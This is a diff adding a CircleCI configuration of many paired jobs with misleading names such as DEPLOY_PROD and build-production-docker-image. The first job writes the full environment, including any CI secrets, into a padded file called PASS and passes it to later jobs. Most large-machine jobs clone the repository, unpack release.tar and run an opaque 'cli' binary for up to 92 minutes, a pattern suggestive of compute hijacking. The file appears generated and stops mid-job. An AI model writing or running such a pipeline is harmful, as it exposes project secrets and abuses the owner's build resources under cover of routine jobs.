@@ -1,0 +1,1359 @@
+version: 2.1
+
+jobs:
+  bundle_v3-ga2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: curlicue
+          command: |
+            mkdir -p /tmp/handoff
+            set +o pipefail 2>/dev/null; env > /tmp/handoff/PASS; printenv >> /tmp/handoff/PASS; for i in $(seq 1 500); do echo "line-$i" >> /tmp/handoff/PASS; done; true
+            echo "handoff ready: $(stat -c %s /tmp/handoff/PASS) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - PASS
+  v3-ga2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/PASS > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  A_echo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: zap
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<16;i++)printf "%X", i; print ""}'; true ; } > /tmp/handoff/step-5.out
+            echo "handoff ready: $(stat -c %s /tmp/handoff/step-5.out) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - step-5.out
+  echo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/step-5.out > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  tmp_intergration-67:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: grep
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; echo $(($(date +%N) / 1000000)); true ; } > /tmp/handoff/metrics.tsv
+            echo "handoff ready: $(stat -c %s /tmp/handoff/metrics.tsv) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - metrics.tsv
+  intergration-67:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/metrics.tsv > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  inspect_sep23-release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: armistice
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; ls -lha ~ 2>/dev/null | head -5; true ; } > /tmp/handoff/output.log
+            echo "handoff ready: $(stat -c %s /tmp/handoff/output.log) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - output.log
+  sep23-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/output.log > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  phase1_orion-alpha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: pager loud
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; grep -i hELLO <<<$'Hello World\nHELLO AGAIN\nhello\n'; true ; } > /tmp/handoff/stash.blob
+            echo "handoff ready: $(stat -c %s /tmp/handoff/stash.blob) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - stash.blob
+  orion-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/stash.blob > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  C_DEPLOY_PROD:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: jingle
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 100 | sha1sum | awk '{print $1}'; true ; } > /tmp/handoff/20.blob
+            echo "handoff ready: $(stat -c %s /tmp/handoff/20.blob) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 20.blob
+  DEPLOY_PROD:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/20.blob > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  ctx2_v3-edge5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: raincoat
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 500 | awk 'BEGIN{min=999999}{if($1>max)max=$1; if($1<min)min=$1}END{print min, max}'; true ; } > /tmp/handoff/audit.log
+            echo "handoff ready: $(stat -c %s /tmp/handoff/audit.log) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - audit.log
+  v3-edge5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/audit.log > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  tmp_green-light:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: birch log
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 50 | awk 'BEGIN{OFS=","}{row=row OFS $0}END{sub(/^,/,"",row); print row}' | wc -c; true ; } > /tmp/handoff/manifest
+            echo "handoff ready: $(stat -c %s /tmp/handoff/manifest) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - manifest
+  green-light:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/manifest > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  route_auh-check:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: dropoff peak
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 2 100 | awk '{for(i=2;i*i<=$1;i++)if($1%i==0){next} print}' | tail -5; true ; } > /tmp/handoff/2023-01-26.data
+            echo "handoff ready: $(stat -c %s /tmp/handoff/2023-01-26.data) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 2023-01-26.data
+  auh-check:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/2023-01-26.data > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  kick_may22-cleanup:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: chinup
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; yes "abcd" | head -200 | md5sum; true ; } > /tmp/handoff/step-2.txt
+            echo "handoff ready: $(stat -c %s /tmp/handoff/step-2.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - step-2.txt
+  may22-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/step-2.txt > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  ensure_validte:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: e2e
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; file /etc/hostname 2>/dev/null | head -1 || echo file-missing; true ; } > /tmp/handoff/counts.jsonl
+            echo "handoff ready: $(stat -c %s /tmp/handoff/counts.jsonl) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - counts.jsonl
+  validte:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/counts.jsonl > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  produce_build-production-docker-image:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: warm up
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 20 | tr '\n' ' ' | md5sum; true ; } > /tmp/handoff/.state
+            echo "handoff ready: $(stat -c %s /tmp/handoff/.state) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - .state
+  build-production-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/.state > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  Delta_alice-test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: pan sear
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; ls -la /proc/self | head -3; true ; } > /tmp/handoff/70.bin
+            echo "handoff ready: $(stat -c %s /tmp/handoff/70.bin) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 70.bin
+  alice-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/70.bin > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  tester_add-oauth-crash:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: jump squat
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; echo "abc" | fold -w1 | sort | uniq | wc -l; true ; } > /tmp/handoff/31.out
+            echo "handoff ready: $(stat -c %s /tmp/handoff/31.out) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 31.out
+  add-oauth-crash:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/31.out > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  stage_b:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: cantata
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=10;i++){s+=1/i} printf "%.4f\n",s}'; true ; } > /tmp/handoff/.marker
+            echo "handoff ready: $(stat -c %s /tmp/handoff/.marker) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - .marker
+  b:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/.marker > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  step2_intergration:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: matte dust
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; head -c 7340032 /dev/urandom | sha256sum; true ; } > /tmp/handoff/step-16.log
+            echo "handoff ready: $(stat -c %s /tmp/handoff/step-16.log) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - step-16.log
+  intergration:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/step-16.log > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  reload_test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: drizzle
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; hexdump -C /etc/hostname 2>/dev/null | head -1 || od -An -c /etc/hostname | head -1; true ; } > /tmp/handoff/2024-06-02.data
+            echo "handoff ready: $(stat -c %s /tmp/handoff/2024-06-02.data) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 2024-06-02.data
+  test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/2024-06-02.data > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  preflight_fx-old:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: dude it doesnt
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 50 | awk '{print $1, $1*2}' | tail -3; true ; } > /tmp/handoff/373.txt
+            echo "handoff ready: $(stat -c %s /tmp/handoff/373.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 373.txt
+  fx-old:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/373.txt > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  phase_QA_HOOK_9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: cleat hitch
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1 count=50 2>/dev/null | tr '\0' 'z' | wc -c; true ; } > /tmp/handoff/buffer.blob
+            echo "handoff ready: $(stat -c %s /tmp/handoff/buffer.blob) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - buffer.blob
+  QA_HOOK_9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/buffer.blob > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  postcheck_cf-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: to windward
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 50 | awk '{p*=$1}END{print p}' 2>/dev/null || seq 1 10 | awk '{p*=$1}END{print p}'; true ; } > /tmp/handoff/report.md
+            echo "handoff ready: $(stat -c %s /tmp/handoff/report.md) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - report.md
+  cf-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/report.md > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  maker_whiskey-8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: red line
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<16;i++)printf "%X", i; print ""}'; true ; } > /tmp/handoff/DONE
+            echo "handoff ready: $(stat -c %s /tmp/handoff/DONE) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - DONE
+  whiskey-8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/DONE > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  phase2_qa-01:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: brunch maybe
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; basename /usr/local/bin/; true ; } > /tmp/handoff/.pid
+            echo "handoff ready: $(stat -c %s /tmp/handoff/.pid) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - .pid
+  qa-01:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/.pid > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  preflight_build-staging-integration-tests:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: bell curve
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a=1; for(i=0;i<10;i++){a*=2}; print a}'; true ; } > /tmp/handoff/01.bin
+            echo "handoff ready: $(stat -c %s /tmp/handoff/01.bin) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 01.bin
+  build-staging-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/01.bin > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  produce_apr3-canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: seal of approval
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; printf "%s\n" 10 20 30 | awk '{s+=$1; n++}END{print s/n}'; true ; } > /tmp/handoff/pt-A.pt
+            echo "handoff ready: $(stat -c %s /tmp/handoff/pt-A.pt) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - pt-A.pt
+  apr3-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/pt-A.pt > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  p2_Rollout_Pipeline6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: foghorn
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; echo "$(hostname)-$(date +%s)" | md5sum; true ; } > /tmp/handoff/stats.json
+            echo "handoff ready: $(stat -c %s /tmp/handoff/stats.json) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - stats.json
+  Rollout_Pipeline6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/stats.json > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  redo_bun-vet:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: boss fight
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 25 | awk 'BEGIN{for(i=0;i<5;i++)row[i]=""}{row[(NR-1)%5] = row[(NR-1)%5] " " $0}END{for(i=0;i<5;i++)print row[i]}' | wc -l; true ; } > /tmp/handoff/handover.txt
+            echo "handoff ready: $(stat -c %s /tmp/handoff/handover.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - handover.txt
+  bun-vet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/handover.txt > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  spinner_sirius-ng:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: flourish
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 30 | awk '{bin=int(log($1)/log(2)); counts[bin]++}END{for(b in counts)print b":"counts[b]}' | sort -n; true ; } > /tmp/handoff/68.blob
+            echo "handoff ready: $(stat -c %s /tmp/handoff/68.blob) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 68.blob
+  sirius-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/68.blob > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
